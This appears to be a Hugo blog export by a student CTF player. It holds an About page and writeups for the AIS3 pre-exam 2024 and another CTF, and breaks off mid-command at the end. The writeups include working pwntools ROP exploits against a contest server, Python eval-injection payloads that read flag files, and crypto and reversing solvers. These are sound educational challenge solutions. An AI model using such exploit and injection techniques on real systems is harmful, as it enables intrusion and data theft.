[{"content":"\rwhoami #\r我在社群上用的名字是 Dr.dog，目前高二\n常打ctf，主要玩reverse和pwn，crypto也有練過一陣子\n以前是打競程的，不過也沒有碰很深\n本職是諧咖兼宅男，夢想是work from home\n平常三點睡，麻煩各位體諒一下我的肝;3\n睡死了就別叫了\nHow to find me #\r我比較不常使用instagram和line:(\n有事可以在dc找到我，id:hokak_，加好友之前稍微自我介紹一下就ok了\n比較正式的事可以找我email(頭像下方)\nBlog #\r建立blog的契機是因為懶得自我介紹\n痾我需要一個blog來放筆記\n比賽的時候copy自己的起來比較快\n網站架構是用Hugo \u0026amp; Blowfish\n以後會不停的修改網站的外觀，(雖然我不是學網頁設計的，但我有強迫症)\n也會把hackmd的東西搬過來\n喔對，背景都是來自蒼之彼方四重奏，蠻推這遊戲的\nExperiences #\rCTF experiences #\r2024 ACSC CTF hokak 152nd(Country place: 12nd) 2024 THJCC CTF THJCC_hokak 2nd 2024 AIS3 pre-exam hokak 42nd 2024 Scist 4th final CTF SCIST_18 1st 2024 Imaginary CTF ICEDTEA(team) 61st Competitve Programming #\r2023 APCS 3/3 2024 APCS 4/4 2024 HSPC 決賽 Activities #\r2023 SCIST 4th 學員 2024 TFcis 網管組，資安教學(? 2024 臺南一中國中生程式設計營 基礎班講師 2024 ICEDTEA(實中資安) 戰隊成員 2024 AIS3 學員 2024 B33F 50μP(成大資安社) 戰隊成員 2024 臺灣好厲駭9th 學員 ","externalUrl":null,"permalink":"/about/","section":"Homepage","summary":"","title":"About","type":"page"},{"content":"\r前言 #\r先不說是不是用運氣打的(那題pwn是我半夜夢到解法起床解的)\n題目蠻有趣的，值得參加\nMisc #\rwelcome #\r複製貼上\nQuantum Nim Heist #\r首先move完一顆後，接下來如果讓你選擇，而你選擇0~2以外的選項\n伺服器就會當作你有做過操作了，但你其實沒有\n所以現在只有ai再取石頭\n等到ai取到剩下一排，把那一排取掉就可以獲勝得到flag\nThree Dimensional Secret #\r開啟的封包檔，前面一一個Cura_SteamEngine 5.6.0 找到Cura SteamEngine後，發現這是一個3d列印軟體 把這個tcp stream改成副檔名.gcode後 再用Cura SteamEngine該起就有flag了 Emoji Console #\rflag是一個資料夾 拿到app.py和Emoji、command的對照表 flag裡面由一個flag-printer.py 執行並得到flag\nCrypto #\rbaby RSA #\r從source code可以知道他是針對每個字元進行加密的 所以只要爆破就可以得到flag了\nflag = [59582983136368434856816799733313446746433796034384724221174424464969737874802116129348607979328098841766335449896610931770063087921739964156335144291643702667891887833963756948394265219864837961748202920096128332905237576243643095664147826020400199347355043162641743846198725931842313977049712473768688780204, 95359547394031742813518330673269556403528254059894407470006786975603938062435320319282644182444182438612748874603359501010449113346386193598111715879103479311697744375488228536365895249959983701008182395138745363343749821348881488616739650767615867269542213617639437927373484681942750228038458670913761461906, 46329325300279098651694178842591774415260876326218182283454895682597312145324055490326488805186682301528705330448500034219715636964856131530973835780285303243952273742119154142469279746360304190118988650200422700136950019141246372634642054318988506247030406078971388938494583721698317950574261574174233878465, 99372516099607712778908802720080113062724120782160998443385643772511391370661101893707293382044546993124605549696368316348952556779713164710839853078160450782104255053788389238478472574549113909833434906535103012424826026640284958298083646000213492094244631381094489147645893989473799375006911204994971262513, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558, 12319813533472769541026063795801870849236715810997656653501875874806446093919930377755747066386074676697058702735112064576219731845584108035461434499628574742399407498867908576045220515065246483998134315307132901329833371485817530138131352593805641664023978795298886913968639954517583992930243922021434381738, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 1665805297521640119669919457094144711238099413231800824465470812913880572669116305626521524153911904267238129531937952423409222225023467794927666422627082314285814656075569814644205638687105792760533211008966815918943917251927254624389871965679206262024216136163262412286874416732008465838711695063592124435, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 38285633551521777138710771085033430239170710707266775875598456653892976969437761922968925746226073683095654278272586779539831402373205526909772633370025848937463033570747721110932401276480992827694564074802181306738438015295515798739406061377284368603543443076476369810597345436481251791260803352288977423573, 90968383857681404242927909477464252602387471219945950453665598772039832078487309149670692874283215437984574695320981806360379096212936326954111131608499584545969103096096842380877613033764006459107764277330135816044808210474597200172673683909558627722941503504083244424751773797618360290613996970960151563724, 95457298055868694391877219138576497445115151186056513418820503159496876268497080831408725541436969299827723238663173668798694515208450035233192338795425824459299174728295661096981248839235055855929604893139239340445385259232905864515397406993189217322907168121716905101208450279521267289056195400878302077398, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 34661612116812273325510815885632987773878634626625747042958636362152583931260969561869719786378247664638641161656878412129162010084766438156247296031040184022246208883138926132649114007757242227131459285251878118564710945280013332131793855359773876332415772442620349609897435915019325055421286197078708187352, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 67602482196856820166971428403758405739455475263382367621161896414339370625380754447863410276767241406699969322350803814348655243066328706656427717483623041308690996376549835317954286006923639192767262817817435759143930376297271756237829141630002480289781731985465743331200468015517012225741723423203374827341, 44262354102194743351911268289256770008339497245528544280709170541530088518398751380655719846628700171065092804544687718896291531970838072744874705570156704628202662829757806782131182294252555844059856971743311355891113953747318316062265029166813195656690004051327523203179399349334322871113218009692321746302, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 17525442355443739006798161136945234538289135293732159010469949341666347513585837371870704355037863634098163883611042121878362686860890223724238562583526550649340086051319234134907577624853632886715848962127706255769976443912657070070366400669740596805962173530384420842637554803041466900119050709458062167550, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 32463563387229396502994321924065961632284043136468238906625180045736135155253223928723914405824284085442712712337348213915399745045346853697650399659292339726614512642835897683094877670342609027803404027945312939777902664125228095034970967750466928999176126534504349068649205422848461193336320361026425455874, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20222920908058605457111970272150612273139460769260447235596498596781683961010128426184024637706564546340327246191020540223566835757304493325371606037680402571948650998523099138137441154209281794538860160477031997660506452095283151142470607354579609545040759974018408429796935802188551530478970289514572978617, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 44014841046589017601891983719958867760419600204352901036629548332837496204051161377933425345536644034794916246706885620488552830053604204333015893225255398323167834260921720336325397193593333461140140475610284003097590899522403244883330800589948361851693870192559674072749868797979125684663605722325053340834, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 63634815088527144255090148113948593793648445499224983027630191877159813968754095341812467946868079279626991968747689424489021633678743106301884613005477044402324870044751927862596590687251830485165119422247449722579599610918927243419033509419967393677988976255284611384351411782311379786356079256916831362626, 9304987377904341606117201715658113065608581640101320211543462955469900806281721467187032121463132314663326494170970278379001634044806680348131292368949519512445580695938064509920503814133961673755470696223243390646274004621955993274826096679460577701554059204349111764901921932386091658007427259226167178177, 58828925452729811932976588739787965824652220690551333824296205824127538696058603108169405357158211350616510470513672533759883740745736322687898383422522330915631984810878357007178714597068087752425823728826608887027664209314455243118645386520598961325656254330576959063500755210398248129074822706590225088700, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 32184464000490155748453165982143565340499464338829080683417468389784993809512708479494827939476307049612151190695993375700147700844413744001417893095868641387694266647992101758785355055413538046252854525860440227182911367045556141460084455472907278113962890024281663648508886642376786194323597791020547317088, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 12179738687529782107447590339149361896936551322934825418520525165858885435598866363152322677187041910693780230742925050834968940508546403788452893248148672885195158450001568668626998159030042932978014971079411358732702590558133373478956077176801426446288446920254354063720982962966912703174841575095158773376, 38031617734525236754862788270684927634041250565347090806313746312968815507316236887544784308484734926981400017478758364119367924220519253824976349577671434162884831759762106665665138444165001645856871491952279748415831766579735400499998753646766301606966507940299051979075677572064596983713461662607114250263, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 101125682339799901828662987568918086070282069568379908090074247169217184659644669626554838396604623590909101664987452894437649857681299514293609000818253780343589956828098266778252516930801354335366245918603834198786544373944956666900784678369416240212915856834107510529441463083826031881209805666209335413628, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 42674155454878392842592499423860033988264245394501952163129442865919203299671995689679354090226093903765768139477289952989042795959374257614752953563152551974557414325407858919156902405925850703390450181868760242922958259454422450849566085988801215229822701373233313619020572460459663094142218119144686335871, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 47953002091054578020381201294163023730809574731463958773592358719441988187452655748118051277286650853337305718192021972814357369747332979634917684999259838316305009239963225119133204824897098152777119627043881500966537112886938182847527574241215915396651397126350467492479189194162628876529519538265140143596, 101403644290884991310189664359755656780537902543354415482434580937410695343294757120985680350019917171639284125327989098680673553323894980248499865788837636944758311200094760909373728675822272584823764964753326309765279310435693879623302965536053211433064599526550676915084290753201910772032395483945950367273, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 107340541989905757204370662416845552037146078905222935505789033122562501577684655501092154588544305605078885306044047839464564901594898750722560559313996616820973286189602827331851868376927628179028545097753144658073207307785378721899783095713473789007231709234504050418717400729711972350669632384570468096830, 43967923748936484351732805873555964174712775706889811180819474140612599586161884530658035908721232399384729457223641995556425707839305124083600738135036620220298476686325110132022730675370888898063942501477522619906479683016701151321856269078215479158146009655223314957908787521092587379267241203076718674092, 24333051506853181360030701569319128673885779416125109480872653360245763695810807795571148802002658160356587851857338891650119080260776136984074861612952869696123011417276568821410663401888348228549042676235853145756762295087473309782699704381451505573652641489540319626561348999020895690560418530256831740666, 20472445493228441292721090614657967895462252302228260568752427996680563809601852655319833688134475798137834395223726607334321531235376774219216055134601030184130917876549113091114144486261794932716233808194664233936783735663266743029212488020840969559603523111887524998658108503660068448898570323437482810017, 72893301186321303683272295658327353212060838237559048917336264819112421968115615005989580760612444279776561566669272155758039717810976344470895667733780292960024364644216982543515945404550612735708418065359731237914621596888496631385879381090937225999965270114589266587955012094766794851372212812150698234716, 64855027109789931203406858899259092299626327163376469398846102754805420506427252072315662287801006608894162707199492268892939811482863649987034183371607590158980649349849687594118554925649076468007225363531072941142253057862686631842080812159597499430107963982315266135241847383726503265496996481889717246182, 52468135911274945777529136529541932989316502665934748207836694395110108517204287366878248216053327656034128346107236076714109214143042824050810182510919475258788845504651287598248217763885663385525333584236650693667648746329707103824387098563158188013686337454772275459145419197015884603853408230553227896407, 75918055185950026238164530295762591705002247585433355113315303142207464051952569831664550604622541858093495062851840811257603174544255151597115446984458237694842739071530518936317606199598953518976167711716762043806043449827887577909963803673508838826582484003687958862302989732473748700329398645880243054148, 12708160939460449797746334640370189741594393156198590130563300705594742285274155378452384449752817944962371880018673966875751948953034846634284138305820292201281595210265881917297911731564408181887226462606892964361033320116765426523499831287478314065882300932476595216136350756971622192468975464823677154324, 52745488365658861485519010696623986434656675831322149607647058389953842185045922621964255927212518970223978973817292179059730382537814695353016058702226289640834171560498112170760826276332972100423555174686162215383841925656596984188536350046664199627214379076416024495451320834231863438007383528385204646269, 8855798603366167912634233401398286651752671525801140525178611090639905433230380535711326462952071294452556819384200831430822862220907470038589552641363759764881881084119960616686113091264272665290715332905431138686504873774368450566561688814993821800992967990682116846800657243011069696481920893909247794983, 96951009388162450018398074248238612521098089563081241061172635732154749686698900516806076917644927142046116130006730586770841058020946718314769404592479949673385387831784647829787593435525861689652400487918043078535385527278516028607916478700007746817161408140805937414915909575928550204945457887011906141614, 3085377115073481737487767519304315808353144937670566256348398664810936964565637157736537945459712875615504238408907602974507381828272609303797146395233485026377776965939508974096385939172942695211339651597248692728550782246178293579153110379844451779466255357619524290412118137515779354431956948078394927940, 48345447683174081443502925378502329908064423944850311779861406407783604557812792515281621715817536127803162311234459315836524837064977025182379655213338205159741266326939713833052921255157742860610743189155260503439836583887313584730345974553768985184119012533854386867355018502198395672167297716386558437643, 2943509185067047938273565758747957807917637430462018374124947856251091022696853505230975399503014099411245162812979057344198094444949853114144790397928000334361276864689352349519363636219566973775714458213611238774130167222835759501223813455853370320854862131109567941072112035263351158877256955712543549605, 76560888147807476608165550435978536197327212318831455594999273843368454289391559274947371380742007729563677938535717707232627424457601159959128489070947748904688640279908482263289424669338790488996485849079890881530740377280113682547250364463080771156212510360194563192123664613212111565777733487081937952558] e, n = (64917055846592305247490566318353366999709874684278480849508851204751189365198819392860386504785643859122396657301225094708026391204100352682992979425763157452255909781003406602228716107905797084217189131716198785709124050278116966890968003294485934472496151582084561439957513571043497031319413889856520421733, 115676743153063753482251273007095369919613374531038288437295760314264647231038870203981488393720761532040569270340726478402172283300622527884543078194060647393394510524980830171230330673500741683492143805583694395504141751460090539868114454005046898551218623342425465650881666420408703144859108346202894384649) for ch in flag: for i in range(128): if pow(i, e, n) == ch: print(chr(i), end=\u0026#34;\u0026#34;) break WEB #\rEvil Calculater #\r題目會執行你送出的post的資料，並回傳執行結果(過濾掉底線和空白)\npayload: open(\\\u0026quot;../flag\\\u0026quot;).read() 丟到burp即可 PWN #\rMathter #\r把goodbye()函數decompile之後可以發現這邊有一個gets()函數 可以利用這點跳到win1()和win2() 跳到win1()之後，函數會要求第一個引數的值為0xdeadbeef\n這時要利用ropchain:\npop rax; ret; 0xdeadbeef win1_addr 同理win2()會要求函數第一個引數的值為0xcafebabe\npop rax; ret; 0xcafebabe win1_addr source code:\nwin1 #\rfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # r = process(\u0026#34;./mathter\u0026#34;) r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 50001) # gdb.attach(r) win_addr = 0x4018d0 rbp_addr = 0x4bd000 pop_rdi_ret = 0x402540 rop = flat( pop_rdi_ret, 0xdeadbeef, win_addr ) payload = b\u0026#34;aaaa\u0026#34; + pack(rbp_addr, 64) + rop print(r.sendlineafter(b\u0026#34;Enter an operation and two numbers (e.g., 1 + 1) :\u0026#34;, b\u0026#34;q\u0026#34;).decode()) print(r.sendlineafter(b\u0026#34;Are you sure you want to leave? [Y/n]\u0026#34;,payload).decode()) r.interactive() win2 #\rfrom pwn import * context.arch = \u0026#34;amd64\u0026#34; context.terminal = [\u0026#34;tmux\u0026#34;, \u0026#34;splitw\u0026#34;, \u0026#34;-h\u0026#34;] # r = process(\u0026#34;./mathter\u0026#34;) r = remote(\u0026#34;chals1.ais3.org\u0026#34;, 50001) # gdb.attach(r) win_addr = 0x4019A2 rbp_addr = 0x4bd000 pop_rdi_ret = 0x402540 rop = flat( pop_rdi_ret, 0xCAFEBABE, win_addr ) payload = b\u0026#34;aaaa\u0026#34; + pack(rbp_addr, 64) + rop print(r.sendlineafter(b\u0026#34;Enter an operation and two numbers (e.g., 1 + 1) :\u0026#34;, b\u0026#34;q\u0026#34;).decode()) print(r.sendlineafter(b\u0026#34;Are you sure you want to leave? [Y/n]\u0026#34;,payload).decode()) r.interactive() 可以得到flag的前後段\nREV #\rThe Long Print #\rdecompile後會sleep 0x3674 秒\n可以先設斷點 在跑到斷點的時候可以編輯Assemble 把數字改成0 刪除的斷點，在printf後設斷點， 慢慢的按continue就可以一個字一個字的得到flag\n火拳のエース #\r從decompile後的偽c代碼，可以得知祕密的字串長度是24\n並將字串拆成4段，並對其進行xor運算和複雜運算\nxor的key\n只要把byte提出來爆搜就可以得到flag(後段)了，前段可以在.rodata找到\n解法\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026#34;defs.h\u0026#34; void xor_strings(char str[], char key[]) { for (int i = 0; i \u0026lt;= 7; ++i) { str[i] ^= key[i]; } } int complex_function(int a1, int a2) { int v2; // eax int v4; // [esp+8h] [ebp-10h] int v5; // [esp+Ch] [ebp-Ch] if (a1 \u0026lt;= 64 || a1 \u0026gt; 90) { puts(\u0026#34;It feels slightly wrong, but almost correct...\u0026#34;); exit(1); } v5 = (17 * a2 + a1 - 65) % 26; v4 = a2 % 3 + 3; v2 = a2 % 3; if (a2 % 3 == 2) { v5 = (v5 - v4 + 26) % 26; } else if (v2 \u0026lt;= 2) { if (v2) { if (v2 == 1) v5 = (2 * v4 + v5) % 26; } else { v5 = (v4 * v5 + 7) % 26; } } return v5 + 65; } int main() { char buf[32] = \u0026#34;AAAAAAAA\u0026#34;; char ans[32] = \u0026#34;DHLIYJEGMZRERYNDRUYODBAHBKEMPBRE\u0026#34;; char key[32] = { 0x0E, 0x0D, 0x7D, 0x06, 0x0F, 0x17, 0x76, 0x04, 0x6D, 0x00, 0x1B, 0x7C, 0x6C, 0x13, 0x62, 0x11, 0x1E, 0x7E, 0x06, 0x13, 0x07, 0x66, 0x0E, 0x71, 0x17, 0x14, 0x1D, 0x70, 0x79, 0x67, 0x74, 0x33, }; for (int k = 0; k \u0026lt; 4; k++) { for (int i = 0; i \u0026lt; 8; i++) { for (int j = 0; j \u0026lt; 256; j++) { int try_n = j ^ key[i + k * 8]; char a; if (try_n \u0026gt;= 65 \u0026amp;\u0026amp; try_n \u0026lt;= 90) a = complex_function(try_n, i + k * 32); else continue; if (a == ans[i + k * 8]) { printf(\u0026#34;%c\u0026#34;, j); break; } } } } } ","externalUrl":null,"permalink":"/writeups/ais3-pre-exam/","section":"Writeups","summary":"","title":"AIS3 pre-exam 2024 writeup","type":"writeups"},{"content":"","externalUrl":null,"permalink":"/notes/algo/","section":"Notes","summary":"","title":"Algo","type":"notes"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/notes/crypto/","section":"Notes","summary":"","title":"Crypto","type":"notes"},{"content":"\rintro #\rranking #\r總排名193/1184|TOP 16%\nsolves #\rCategory solves Intro 2/3(feedback沒寫) OSINT 2/4 Forensics 2/5 Web 1/5 Crypto 3/5 Pwn 3/4 Reverse 2/4 這次比賽只有我一個人，再次體會到團隊合作的重要性\n題目沒有很難，也有可能是我解德剛好都不難 BTW這次比賽有睡爽爽，肝一下有可能爬到前百\nINTRO #\rflag #\r但有人不解，什麼諧咖\nOSIRIS Trivia #\r用 wayback machine 找之前的存檔\nOSINT #\rRickshaw #\r車牌77 CD-xxx，CD代表有外交任務，77代表美國\nU.S. Embassy \u0026amp; Consulates in India找電話號碼\nAuthentic Chinese Food #\r從電話號碼718-875得知位置為Brooklyn, New York\n找到當地的Panda Express 從NYC Department of Health and Mental Hygiene找衛生評級 從NYC Property Information Portal找Year Built、llc Forensics #\rZipZipZip #\r題目給的chalenge.zip，包了很多層zip+txt 檔案結構大概長這樣\nchallenge ├── chunk_0 │ ├── chunk_0.txt │ ├── chunk_1 │ │ ├── chunk_1.txt │ │ ├── chunk_2 │ │ │ ├── chunk_2.txt │ │ │ └── chunk_3.zip │ │ └── chunk_2.zip │ └── chunk_1.zip └── chunk_0.zip 但每個chuck_##.txt都只有五個字元，可以利用這點讀出所有字元\n一個檔案在這個zip格式大概為檔名|內容|504B\n取前十個字元base64 decode可以得知這是一張圖片的base64\nsolve:\nimport base64 s = open(\u0026#39;challenge.zip\u0026#39;, \u0026#39;rb\u0026#39;).read().split(b\u0026#39;.txt\u0026#39;)[1:] flag = b\u0026#34;\u0026#34;.join([x[:5] for x in s]) open(\u0026#39;flag.png\u0026#39;, \u0026#39;wb\u0026#39;).write(base64.b64decode(flag)) flag.png:\nThe Triple Illusion #\rplaintext: key: solve:\nplaintext = \u0026#34;csawctf{heres_anew_key_decrypt_the_secretto_reveal_flag}\u0026#34; key = [0,0,0,0,0,0,0,0,15,23,23,4,7,0,22,1,23,28,0,18,10,12,0,7,23,2,17,18,21,16,0,0,0,0,0,28,7,16,17,16,6,17,11,0,1,0,21,23,4,24,0,0,0,0,0,0] for (ch, ch2) in zip(plaintext, key): print(chr((ord(ch)^ch2)),end=\u0026#34;\u0026#34;) 解是用xor，可以從plaintext的字元分布和key得知這兩者的關係\n另外這題其實有三張圖片，有一張藏了vigenere cipher\n但沒有用到解出來的資訊\nWeb #\r題目的app.py有eval()，利用他開啟leaderboard.txt(題目要求 )\npayload:open(leaderboard_path, 'r').read()\n==注:賽後題目連結掛了，沒實際截圖==\nCrypto #\rTrapdoor #\rfrom Crypto.Util.number import long_to_bytes, GCD c1 = 303135796212555524279246573902478466434668217093546174680188235179057490491567473700120780102242009132103258508861486434415180823527955099967761217116349255542170598035252007386938049207815599595446898483965896318999163451327331078078222461159124295427725319096144123597554777586957979868444674275889889844032174888734978810757381148576980597387087054100968752977308860522457902588682074271109316333433256639990524116155937375917691984587952422148443784463343758327600719630349711698888298784945165573146249574661292447746934401167219320522948251442094538198108317569766073873733715196594572438686070303424017394902382093899765518500483375456912409097537955914052714322746314137960293312838915565869071605155935644478996344290292865819278674982079257062718982942611077051220570396851353684880714275636550356149610683653718033949374671376446552695669216994087720088804557425225900737145094882031616103378878538121913250609632802433851115524402329496182016641849196645450203369856549243934741848598773875346669657888813923243297096273166067843490617097664952249302907248385981657386549425150606813818575526156807496438444686156127519692376856599876276294335897476875870006918535394383682369081298573978241442661476323352300777091182989 c2 = 495857475060520388524171972560562329613974853400983822020845888925730491600062430518172516899260704264560273781934223594302859722530534832340660062529848264990086782051303987790503975423180262299331338615407534533214682113133599329293031129085100449577992934518434344656657494285931938564813850628647927736024583131744532009049044693917571326537857384102056783307220756946741412271768559975747252067027985539444943113529028970650318126952304374213699662922237891802823976468380268943050107475055909459355423686208238246597053465755603350070481628534681615531080212087446170332283155265359882706315659670116316266081501682694077818665850673103109986674113042710753378454481553052577850617521346621778611947759859049949511238712479205224753501152768840659660348125732219509602068105609818744217345793400652546782588924616710717604789311834310946503565014125112936386821830814255281895686800886900005134607852450727343155282371024191291186227931359848093297797055981177703223050327072826245731656444970746670962178893596866749248985055819064026711206591064102568684210270239031311552084894623247525907933925015980322475751964290174523048766068652767848785157128558417911661948655949158005943910504885480428658407000419115833416727420060 e = 65537 n1 = 849335341290886685305469218391857707731284340958190419070185843136010157709429053610422484475132681533748719098278969826215644874339472967353132551879455362882996907567507113593506825753079778590426114664641480816600384751471656645291232769230937136910355259284237110429149485567788006502323613635933685865306368710784061314928154920731534552117321317277211567493110152566489842583624729165341328622863262200606012259883201617700955694695922994087859464481658597983611169234466124699760530832690946886672455760158700223782288051380457731164725645861312489664513789670524826747778520365562211927266455463083486309711423210020471808741823123222068864708556581964581065834988620566447012299912244270348094665860535141932228229489208553114464044014430205989899364599981035118586030905442204839171480278940939019668106564678143657774136844418987220537475593181825555444917027626563850710659384061650161954669583365646428622075935490337721802367242209967740698482568921310122475447746639557770945332710012170102525879752975818050520509857439519049644785825032104077215376906019647567250546984958145151649505898444718072843209364124945650856086793772364425465519611908098951364026287867524069822425347155753599639554767185278129507433506309 n2 = 603523566530333849178340428498944902666363745873836128019046104968850160788559626859110536807737092301279190275717524103231817119850380847226716405338227641758799619075339058107790224618949070936355847696512320584610781171628029295879025358995297274114650904664397977445850692346888664395462514491694005594326981267020658004853078220869498716454480503670832534655687832674317698341533791287606520109612425394700304038251923496303824119858678564161604483027565550190673989872119144198248907235642586281776334255518772240197897432768870606595017185449736217266994920355907164372528751413042250719701199348091884608946014594175762002630845986429797454686315898064893067919327646448166242760968074216672400981626176888822037453360011497389835122764853203956625199041071100777042750119671525508293375356678113231545760621792785884810027728859682751883206526242837955866065528264740145465244712713969196077012700370049597156003550177262301319126400428989863912190142334126607178261626969803469625974325630891730058651069671841464378913213797770918193912221804892109419238634557345136168738280281615754564955678609409321720136879847520102473459064293144553235291623089686442091239836122526756636264103227262956791809160643363991596481281713 def rsa_decrypt(c, p, q): phi = (p - 1) * (q - 1) d = pow(e, -1, phi) return long_to_bytes(pow(c, d, p * q)) p = GCD(n2, n1) q1 = n1 // p q2 = n2 // p print(rsa_decrypt(c1, p, q1)) print(rsa_decrypt(c2, p, q2)) n1和n2有公因數，直接分解\nDiffusion Pop Quiz #\r這題他給了一個script，主要是在描述透過sbox擴散(diffusion)\n題目是問答題，只要達成他給的問題(實際執行一次)就可以拿到flag\nAES Diffusion #\r跟上題一樣，是要學AES diffusion\n||弄一弄就有flag了\u0026hellip;||\nReverse #\rBaby Rev #\r點點點就找到了\n拿去base64 decode\nMagic Tricks #\r逆向加密過程的題目\n把一段文字丟進去會得到一段亂碼叫做output.txt\n所幸相同相同輸入字元-\u0026gt;相同輸出字元\n只是輸出的字元編碼不是ascii\n但utf8可以用\n解題過程:\n程式中輸入所有可視字元，因為我們知道flag只可能用ascii可視字元組成 用python read output作為對照表 alphabet = \u0026#34;!\\\u0026#34;#$%\u0026amp;\u0026#39;()*+,-./0123456789:;\u0026lt;=\u0026gt;?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\\]^_`abcdefghijklmnopqrstuvwxyz{|}~\u0026#34; output = open(\u0026#39;output.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;).read() cipher = open(\u0026#39;cipher.txt\u0026#39;, \u0026#39;r\u0026#39;, encoding=\u0026#34;utf-8\u0026#34;).read() #I renamed challenge\u0026#39;s output.txt to cipher.txt flag = \u0026#34;\u0026#34;.join(alphabet[output.index(ch)] for ch in cipher) print(flag) Pwn #\rDiving Into Null #\r一個壞掉的bash，沒有ls和cat，所以要自己手刻一個:\nls:\nfor f in *; do echo \u0026#34;File -\u0026gt; $f\u0026#34;; done ls -a:\nfor f in 